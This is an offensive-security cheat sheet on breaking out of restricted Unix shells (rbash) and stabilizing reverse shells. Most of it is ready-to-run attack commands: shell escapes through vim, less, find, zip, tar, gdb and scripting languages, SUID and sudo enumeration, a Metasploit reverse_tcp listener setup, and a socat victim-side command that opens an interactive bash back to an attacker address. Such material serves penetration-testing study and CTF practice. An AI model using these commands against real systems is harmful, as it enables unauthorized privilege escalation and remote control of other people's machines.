# Restricted Shell (rbash) Bypass Techniques & Shell Stabilization


## What is a Restricted Shell?

The **Restricted Shell** (like `rbash`) is a Unix shell variant designed to limit user capabilities within an interactive session.  
It adds a security layer, preventing certain actions like changing directories or modifying environment variables — but it can still be bypassed.



## Spawning a Restricted Shell

**Bash**
```bash
bash -r
rbash
bash --restricted
```

**Sh**
```bash
sh -r
rsh
```

Check your current shell:
```bash
echo $SHELL
```

---

## Common Restrictions in rbash

- No `cd`
- No modifying `SHELL`, `PATH`, `HISTFILE`, `ENV`, or `BASH_ENV`
- No using `/` in command paths
- Limited usage of builtins like `.`, `history`, `hash`

If a program can run system commands, it can often be abused.


## Environment Enumeration

- Test basic commands: `cd`, `ls`, `echo`
- Test operators: `>`, `>>`, `<`, `|`
- Check available languages:
  ```bash
  python --version
  python3 --version
  perl -v
  ruby --version
  ```
- Check sudo permissions:
  ```bash
  sudo -l
  ```
- Check for SUID binaries:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
- Confirm shell:
  ```bash
  echo $SHELL
  ```
- View environment variables:
  ```bash
  printenv
  ```

---


## Bypass Techniques

### If `/` is allowed:
```bash
/bin/bash
/bin/sh
```

### If `cp` is allowed:
```bash
cp /bin/bash ~/sh
```

### Exploiting Programs:
- **FTP**
  ```bash
  /bin/bash
  ```
- **GDB**
  ```bash
  gdb
  !/bin/bash
  ```
- **Man / Less / More**
  ```bash
  man nmap
  !/bin/bash
  ```
- **Vim**
  ```bash
  :!/bin/bash
  ```
- **Find**
  ```bash
  find / -name test -exec /bin/bash \;
  ```
- **SCP**
  ```bash
  scp -s /path/to/script username@target:/destination
  ```

---

## Language-Based Shell Escapes

- **Python**
  ```bash
  python -c 'import os; os.system("/bin/sh")'
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```
- **PHP**
  ```bash
  php -a
  exec("sh -i");
  ```
- **Perl**
  ```bash
  perl -e 'exec "/bin/sh";'
  ```
- **Ruby**
  ```bash
  exec "/bin/sh"
  ```
- **Lua**
  ```bash
  os.execute('/bin/sh')
  ```
- **Bash**
  ```bash
  bash -i
  ```

---

## Advanced Bypass Techniques

- **Zip**
  ```bash
  zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
  ```
- **Tar**
  ```bash
  tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
  ```
- **SSH**
  ```bash
  ssh user@10.0.0.3 -t "/bin/sh"
  ```

---

## Reverse Shell & Shell Stabilization

### Common Tools
- Netcat  
- Socat  
- Metasploit  

---

### Metasploit Listener
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

### Shell Types
| Type                  | Description                                |
|:---------------------|:--------------------------------------------|
| Reverse Shell          | Victim connects back to attacker             |
| Bind Shell             | Victim opens port, attacker connects in      |
| Interactive Shell      | Real-time user interaction                   |
| Non-Interactive Shell  | Runs preset commands or scripts              |

---

## Netcat Shell Stabilization

### Python PTY Upgrade
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Then:
- Background with `Ctrl+Z`
- Run:
  ```bash
  stty raw -echo; fg
  reset
  ```
- Restore settings
  ```bash
  export SHELL=bash
  export TERM=xterm-256color
  stty rows 38 columns 116
  ```

---

### rlwrap
Improves Netcat shell on Windows:
```bash
rlwrap nc -lvnp <port>
```

---

### Socat Interactive Shell

On Attacker:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On Victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

---

## TTY Upgrade Cheatsheet

1. Spawn PTY:
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
2. Background shell: `Ctrl+Z`
3. Get terminal info:
    ```bash
    echo $TERM
    stty -a
    ```
4. Set raw mode:
    ```bash
    stty raw -echo
    ```
5. Foreground shell: `fg`
6. Reset terminal:
    ```bash
    reset
    ```
7. Restore settings:
    ```bash
    export SHELL=bash
    export TERM=xterm-256color
    stty rows 38 columns 116
    ```
8. (Optional) Start `tmux`
    ```bash
    tmux
    ```

---

## Conclusion

With these techniques, you can bypass restricted shells and stabilize reverse shells into fully interactive TTY sessions.  
Always practice in safe, legal environments like CTF labs or virtual machines.
